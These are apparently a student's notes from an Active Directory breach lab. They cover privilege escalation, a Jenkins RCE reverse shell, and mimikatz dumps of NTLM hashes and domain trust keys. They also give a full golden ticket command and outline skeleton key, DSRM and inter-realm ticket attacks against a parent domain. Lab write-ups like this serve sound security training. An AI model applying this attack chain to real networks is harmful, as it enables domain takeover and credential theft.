------- Lab assume breach scenario ---------

Start as a low priv user in machine.

1. Priv escalation from user to local admin
(lesson on how to 
-how to use powerview.ps1 and admodule.dll
-enumerate domain, users, shares, acl, domain trusts, and look for juicy info)
-disable antivirus/windows defender to run scripts

Using normal user student133
	-Discover local privesc vulnerabilities and exploit using PowerUp.ps1 (service abuse) to get local admin privileges

2. Pivoting and enumerate
(lesson on how to Invoke remote commands, disable)

using local admin enumerate for other machines with localadmin (can remote using local admin)

Find jenkin with RCE
	- exploit jenkin RCE for reverse shell
			computername: dcrop-ci 
			user: corp/ciadmin

		-> Dump hash using mimikatz
	         * Username : ciadmin
	         * Domain   : dcorp
	         * NTLM     : e08253add90dccf1a208523d02998c3d
	         * SHA1     : f668208e94aec0980d3fd18044e3e64908fe9b03
	         * DPAPI    : 9892675d75e91baace876950ee2fe5e8

3. Escalating to domain admin - look for machines with loggedin domain admin and dump hashes

		-> Invoke-UserHunter to find machines with domain admin logged in and machine also has local admin to be exploited, pivot to it and start dumping hash
			UserName        : svcadmin
			ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
			IPAddress       : 172.16.4.44
			LocalAdmin      : True
		
		-> dump hash using mimikatz
			ciadmin e08253add90dccf1a208523d02998c3d
					-> invoke command at dcorp-mgmt to get domain admin ntlm hash

							Session           : Service from 0
							User Name         : svcadmin
							Domain            : dcorp
							Logon Server      : DCORP-DC
							Logon Time        : 11/16/2020 4:01:42 AM
							SID               : S-1-5-21-1874506631-3219952063-538504511-1122
							        msv :
							         [00000003] Primary
							         * Username : svcadmin
							         * Domain   : dcorp
							         * NTLM     : b38ff50264b74508085d82c69794a4d8
							         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
							         * DPAPI    : fd3c6842994af6bd69814effeedc55d

		-> able to login to adminsrv (local admin). Load mimikatz and dump hash
			         [00000003] Primary
			         * Username : appadmin
			         * Domain   : dcorp
			         * NTLM     : d549831a955fee51a43c83efb3928fa7
			         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
			         * DPAPI    : 7ec84538f109f73066103b9d1629f95e

               		 * Username : DCORP-ADMINSRV$
			         * Domain   : dcorp
			         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
			         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
				    
				     * Username : srvadmin
				     * Domain   : dcorp
			        * NTLM     : a98e18228819e8eec3dfa33cb68b0728
			        * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
			        * DPAPI    : ddce77eab64944efda38b5cfdad5395f

			         * Username : websvc
			         * Domain   : dcorp
			         * NTLM     : cc098f204c5887eaa8253e7c2749156f
			         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
			         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c

4. Start powershell session with domain admin with Domain Admin privileges and start dumping all hashes from domain controller
	-> dump hashes and find krbtgt ntlm hash

					RID  : 000001f4 (500)
					User : Administrator
					LM   :
					NTLM : af0686cc0ca8f04df42210c9ac980760

					RID  : 000001f6 (502)
					User : krbtgt
					LM   :
					NTLM : ff46a9d8bd66c6efd77603da26796f35

					RID  : 00000455 (1109)
					User : ciadmin
					LM   :
					NTLM : e08253add90dccf1a208523d02998c3d

					RID  : 00000458 (1112)
					User : sqladmin
					LM   :
					NTLM : 07e8be316e3da9a042a9cb681df19bf5

					RID  : 00000459 (1113)
					User : websvc
					LM   :
					NTLM : cc098f204c5887eaa8253e7c2749156f

					RID  : 0000045b (1115)
					User : srvadmin
					LM   :
					NTLM : a98e18228819e8eec3dfa33cb68b0728

					RID  : 0000045d (1117)
					User : appadmin
					LM   :
					NTLM : d549831a955fee51a43c83efb3928fa7

					RID  : 00000461 (1121)
					User : mgmtadmin
					LM   :
					NTLM : 95e2cd7ff77379e34c6e46265e75d754

					RID  : 00000462 (1122)
					User : svcadmin
					LM   :
					NTLM : b38ff50264b74508085d82c69794a4d8

					RID  : 0000046b (1131)
					User : studentadmin
					LM   :
					NTLM : d1254f303421d3cdbdc4c73a5bce0201

					RID  : 0000b047 (45127)
					User : Support133user
					LM   :
					NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

					RID  : 0000b053 (45139)
					User : VPN133user
					LM   :
					NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

					RID  : 000003e8 (1000)
					User : DCORP-DC$
					LM   :
					NTLM : 0ffbc912445882bbafe0c66625d5d538

					RID  : 00000456 (1110)
					User : DCORP-CI$
					LM   :
					NTLM : bc7c774ae1c2f9325adee16ff86681fc

					RID  : 00000457 (1111)
					User : DCORP-MSSQL$
					LM   :
					NTLM : 5acf09c93df6805adf482810cc1a38e6

					RID  : 0000045a (1114)
					User : DCORP-ADMINSRV$
					LM   :
					NTLM : 5e77978a734e3a7f3895fb0fdbda3b96

					RID  : 00000468 (1128)
					User : DCORP-APPSRV$
					LM   :
					NTLM : dae2eb887cf962b2907c1273459b58e2

		-> use mimikatz goldenticket attack

			Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'


			-> using mimikatz silver ticket (we need a domain controller hash)
				- Forging HOST and RPCSS ticket to perform RCE using WMI
				- Forging HOST ticket to perform schedule task - getting reverse shell on DC

5. Using admin domain privileges and access to DC

	-> skeleton key attack

	-> DSRM attack
		-> get local hash
			SAMKey : 33e0913ef3886d77d5873060bcea1cfb
			RID  : 000001f4 (500)
			User : Administrator
		  	Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

	-> dump TRUST

		-> mimikatz(powershell) # lsadump::trust /patch

			Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)

			Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
			 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
			        * aes256_hmac       68c8c41b2fab9394e75fbc155581208e35300684a08dc3c43cf8f5406524e785
			        * aes128_hmac       239d70d85f73025b3b4437112e0fb40d
			        * rc4_hmac_nt       56d6cb859fcb2021fa567451813ae4dc

			 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       4f7314c73c858fce77cc312df9efb30c8e0b22c0d5921f194064997b1de5c1b1
			        * aes128_hmac       1e0970c2eef0962d4074aa2d11a9eb83
			        * rc4_hmac_nt       d3b93c0ff5a15ef0bf92ac1fefa14805

			 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
			        * aes256_hmac       e5faf0e00b75d4f6debf02030b9a33a5efa924fa8a94d44857f86f776f3f471d
			        * aes128_hmac       a946df0637c8c35b67bafd8588cda794
			        * rc4_hmac_nt       8a5fe51806524869c00a55d58b801d1b

			 [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       54224115771eacfa0affe9126a9bf8dc79c1c1b4d581ffbfa37a91138f94c86f
			        * aes128_hmac       fd582394eb3e8bb8b0b6977a5c184436
			        * rc4_hmac_nt       04acd642893fb5aaf7894de5a7821040

			Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
			 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       91a7731685d314ffa586a1dcfa895345ea17e254af107f69f2d0464d86e19f94
			        * aes128_hmac       c5f97f276765670513c915af4b443f1a
			        * rc4_hmac_nt       d9d8656f48a82b501cb78a87b6a41843

			 [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       57a15f2d1cb8509b8b4f2a0a353edb79c685cec5f6fd3116dd28054590272afb
			        * aes128_hmac       18e2ac89ce41cdbe1795ec405834cd78
			        * rc4_hmac_nt       f52180be3dfd027c2fa82e9223ebe8c5

			 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       059cbd48edd840e5e6c654563ef9ec5549c8c3caf7a70ef48b9f0b6d2483ee97
			        * aes128_hmac       1c7ea91b6bf41d2a8506480bc8db7473
			        * rc4_hmac_nt       b20462692d3ac644eaee153baa5240bb

			 [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       fb2e2088a69ce050a8c4e646120a9ed83cdb54ac40ff00b62772a07afd18707e
			        * aes128_hmac       0ef5d4f1465f938cb8ebb775f677fa3d
			        * rc4_hmac_nt       611bfeb512200572de9039942de2d13e

			Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
			        * aes256_hmac       2652c82d0f96d59695f265cf70c7a2e6c08813b3ace70da8b03fcfa939b9c119
			        * aes128_hmac       aeb7dc9ad93f5a663aaff587b26efa8d
			        * rc4_hmac_nt       a1f36af7856e252495a9116f32d25db5

			 [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       357f47f585701b0e5c85f53b78fee1c1c74577bdf1f468cae387efdbdad672e8
			        * aes128_hmac       a781d6216a9ed066c4a553baedf0d76e
			        * rc4_hmac_nt       019243013ab374b0202461cfb5445ef2

			 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
			        * aes256_hmac       2d6d2f5a101758b69399a5b274ba2e78aa506aadc0a3e52a106dab71f9294193
			        * aes128_hmac       9fcd89132989031cc9c5b24bda64e737
			        * rc4_hmac_nt       87c7cb3fb6463c9c5ab822c2f4105f79

			 [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
			        * aes256_hmac       61032ad0c7e4e30fd2392fbef763fd8b001b40494d3d665c57c48723d338f9c3
			        * aes128_hmac       9c3b79e98ae9369b146518782e952edb
			        * rc4_hmac_nt       782e2815e66519b03e8a498b270b1098



	6. Using KRBTGT, create inter realm TGT

		-> Inject TGT and able to run WMI commands on parent domain

			-> get reverse shell by creating schedule task (nishan reverseshell)

				-> system nt privilege on parent DC

					-> dump hashes

						mimikatz(powershell) # lsadump::lsa /patch
						Domain : mcorp / S-1-5-21-280534878-1496970234-70076

						RID  : 000001f4 (500)
						User : Administrator
						LM   :
						NTLM : 71d04f9d50ceb1f64de7a09f23e6dc4c

						RID  : 000001f5 (501)
						User : Guest
						LM   :
						NTLM :

						RID  : 000001f6 (502)
						User : krbtgt
						LM   :
						NTLM : ed277dd7a7a8a88d9ea0de839e454690

						RID  : 000001f7 (503)
						User : DefaultAccount
						LM   :
						NTLM :

						RID  : 0000b221 (45601)
						User : root131user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b222 (45602)
						User : root132user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b223 (45603)
						User : root133user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b224 (45604)
						User : root134user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b225 (45605)
						User : root135user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b226 (45606)
						User : root136user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b227 (45607)
						User : root137user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b228 (45608)
						User : root138user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b229 (45609)
						User : root139user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b22a (45610)
						User : root140user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b22b (45611)
						User : root141user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 0000b22c (45612)
						User : root142user
						LM   :
						NTLM : aa5f1b91907b8b180a7e8478313e71ad

						RID  : 000003e8 (1000)
						User : MCORP-DC$
						LM   :
						NTLM : 9173a1825ceb04e80728089874e806cc

						RID  : 0000044f (1103)
						User : dcorp$
						LM   :
						NTLM : d15c1129d09971cf228b4320a298675f

					
